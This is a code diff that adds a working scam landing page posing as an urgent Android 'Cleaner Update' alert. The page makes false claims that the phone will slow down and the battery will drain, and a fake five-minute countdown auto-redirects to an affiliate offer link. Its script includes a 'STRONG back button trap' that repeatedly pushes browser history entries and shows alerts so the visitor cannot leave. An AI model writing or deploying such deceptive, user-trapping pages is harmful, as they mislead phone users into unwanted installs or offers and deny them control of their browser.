@@ -1,0 +1,129 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cleaner Update Required</title>
+  <style>
+    body {
+      background-color: #f2f2f2;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+    .modal {
+      background-color: white;
+      max-width: 400px;
+      margin: 80px auto;
+      padding: 30px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    .modal img {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+    .modal h2 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+    .modal p {
+      font-size: 16px;
+      color: #555;
+    }
+    .timer {
+      color: red;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+    .btn-container {
+      margin-top: 20px;
+    }
+    .btn {
+      padding: 12px 20px;
+      font-size: 16px;
+      margin: 5px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .cancel {
+      background-color: #ccc;
+      color: #000;
+    }
+    .update {
+      background-color: #007bff;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Cleaner Icon">
+    <h2>Cleaner Update for Android is Recommended!</h2>
+    <p>Your phone can work faster. We released a Cleaner update, and it is recommended for every phone.<br><br>
+    If you do not upgrade, your smartphone might be slowed down and your battery may discharge quickly.<br><br>
+    Update now for <strong>FREE</strong> to clean and boost your Android immediately!</p>
+    <div class="timer" id="countdown">5 minutes 00 seconds</div>
+    <div class="btn-container">
+      <button class="btn cancel" onclick="cancelAction()">CANCEL</button>
+      <button class="btn update" onclick="updateNow()">UPDATE NOW</button>
+    </div>
+  </div>
+
+  <script>
+    const offerLink = "https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=VPN_ANDROID&site=ANDROID_LANDER";
+
+    function updateNow() {
+      window.location.href = offerLink;
+    }
+
+    function cancelAction() {
+      alert("Cleaner update strongly recommended for Android performance.");
+    }
+
+    // STRONG back button trap
+    function blockBack() {
+      // Push multiple history entries
+      history.pushState(null, "", location.href);
+      history.pushState(null, "", location.href);
+
+      window.addEventListener("popstate", function () {
+        alert("⚠️ Please update now to boost your phone speed!");
+        history.pushState(null, "", location.href);
+      });
+
+      // Re-push periodically
+      setInterval(() => {
+        history.pushState(null, "", location.href);
+      }, 2000);
+    }
+
+    // Execute immediately
+    blockBack();
+
+    // Countdown logic
+    let minutes = 5;
+    let seconds = 0;
+    const timerDisplay = document.getElementById("countdown");
+
+    const timer = setInterval(() => {
+      if (seconds === 0) {
+        if (minutes === 0) {
+          clearInterval(timer);
+          timerDisplay.innerText = "Time expired. Redirecting...";
+          updateNow();
+          return;
+        }
+        minutes--;
+        seconds = 59;
+      } else {
+        seconds--;
+      }
+      timerDisplay.innerText = \`\${minutes} minute\${minutes !== 1 ? 's' : ''} \${seconds} second\${seconds !== 1 ? 's' : ''}\`;
+    }, 1000);
+  </script>
+</body>
+</html>
